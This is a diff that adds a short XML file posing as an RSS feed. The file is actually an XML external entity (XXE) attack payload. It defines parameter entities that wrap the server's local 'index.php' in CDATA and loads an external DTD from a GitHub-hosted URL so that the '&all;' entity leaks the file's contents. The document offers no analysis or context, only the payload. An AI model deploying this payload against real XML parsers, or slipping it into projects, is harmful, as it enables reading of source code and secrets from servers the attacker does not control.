@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % stuff SYSTEM "file://index.php ">
+<!ENTITY % end "]]>">
+<!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/codemaa/testing/master/externaldtd">
+%dtd;
+]>
+<rss version="2.0">
+
+<root>&all;</root>
+
+</rss> 
